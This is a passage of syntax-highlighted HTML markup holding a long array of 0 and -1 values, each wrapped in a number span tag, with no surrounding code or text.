class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span 